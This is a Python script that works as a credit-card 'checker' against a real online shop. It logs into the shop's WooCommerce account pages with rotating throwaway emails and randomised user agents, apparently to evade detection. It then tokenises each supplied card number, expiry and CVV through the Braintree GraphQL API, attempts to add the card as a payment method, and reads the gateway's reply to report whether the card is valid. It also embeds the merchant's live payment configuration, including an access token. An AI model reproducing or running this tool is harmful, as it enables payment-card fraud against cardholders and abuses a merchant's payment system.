import requests
import re
import random
import time
import string
import base64
import requests,re,random,sys,base64,user_agent,time
from bs4 import BeautifulSoup
def Tele(card):
	user=user_agent.generate_user_agent()
	all_mail=['axjqcczu@hi2.in', 'lgyrhjw@hi2.in', 'jcfagor@hi2.in', 'dvige@hi2.in', 'eoiyg@hi2.in' , 'kaqus@hi2.in' , 'ksscic@hi2.in' , 'smphbrxo@hi2.in' , 'qnwrzv@hi2.in' , 'mjlinv@hi2.in' ,'gtngy@hi2.in']#Amjd
	e=card.split('|')
	cc=e[0]
	mes=e[1]
	ano=e[2]
	cvv=e[3]
	mail=random.choice(all_mail)
	with open('fileb3.txt','r') as file:
		first=file.readline()
	try:
		all_mail.remove(first)
	except:
		pass
	mail=random.choice(all_mail)
	print(mail)
	with open('fileb3.txt','w') as file:
		file.write(mail)
	s=requests.session()
	s.headers={'user-agent':user}
	no=s.get('https://atrantil.com/my-account/')
	login=re.findall(r'name="woocommerce-login-nonce" value="(.*?)"',no.text)[0]
	headers = {
	    'user-agent': user,
	}
	def find(ichi, ni='', san=''):
	    if ni in ichi:
	        yon = ichi.index(ni) + len(ni)
	        go = ichi[yon:len(ichi)]
	        roku = go.index(san)
	        if roku == 0:
	            roku = len(go)
	        return go[0:roku]
	    else:
	        return ''
	data = {
	    'username': mail,
	    'password': 'Ah2002Ah!',
	    'woocommerce-login-nonce': login,
	    '_wp_http_referer': '/my-account/',
	    'login': 'Log in',
	}
	start_time = time.time()
	response = s.post('https://atrantil.com/my-account/',headers=headers, data=data)
	s.get('https://atrantil.com/my-account/payment-methods/')
	ao=s.get('https://atrantil.com/my-account/add-payment-method/')
	op=ao.text
	enc=(find(op, 'var wc_braintree_client_token = ["', '"'))
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	head = {
	    'authorization': f'Bearer {au}',
	    'content-type': 'application/json',
	    'braintree-version': '2018-05-10',
	    'user-agent': user
	}
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'fc4262a6-68d4-472d-a057-b7e8683dfcc4',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': cc,
	                'expirationMonth': mes,
	                'expirationYear': ano,
	                'cvv': cvv,
	                'billingAddress': {
	                    'postalCode': '11226',
	                    'streetAddress': '',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	
	response = s.post('https://payments.braintree-api.com/graphql', json=json_data,headers=head)
	token=response.json()['data']['tokenizeCreditCard']['token']
	pay=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',op)[0]
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': token,
	    'braintree_cc_device_data': '{"device_session_id":"fbfb7929dd4f59bfb1fc9a5cf9379135","fraud_merchant_id":null,"correlation_id":"9640e2960a259fefe16fcdde1ae8d0a6"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/h6nck7m2yyh6mqk4/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/h6nck7m2yyh6mqk4"},"merchantId":"h6nck7m2yyh6mqk4","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"h6nck7m2yyh6mqk4","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3333843690920608617","accessToken":"access_token$production$h6nck7m2yyh6mqk4$c17263feed9f66d5cc7e08f975927dd8","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"KBS Research","clientId":"AZ2WICgQ3fCYcNKRNgw9m3wd5_brlV542A4KeOL3mkkw11N4itXNyWxL_R7KGD0tX8Ssa3bEiyGG10gc","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"kbsresearch_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
	    'woocommerce-add-payment-method-nonce': pay,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	check = s.post('https://atrantil.com/my-account/add-payment-method/',  data=data)
	d_time = time.time() - start_time
	thes=(check.text)
	msg=find(thes, '<div class="woocommerce-notices-wrapper"><ul class="woocommerce-error" role="alert">', '</ul>')
	if 'Duplicate card exists in the vault.' in msg:
		result=('Duplicate card exists in the vault.')
	elif 'Payment method successfully added.' in thes:
		result=('Payment method successfully added.')
	elif 'Payment method successfully added.' in msg:
		result=('Insufficient Funds')
	elif 'Gateway Rejected: avs' in msg:
		result=('Gateway Rejected: avs')
	elif 'Invalid postal code or street address.' in msg:
		result=('Invalid postal code or street address.')
	elif 'Gateway Rejected: risk_threshold' in msg:
		result=('Gateway Rejected: risk_threshold ⚠️')
	else:
		try:
		  result=msg.split('\n')[2].strip().replace('</li>', '').strip()
		except:
		 	result='Somethin Is Wrong ⚠️'
	return result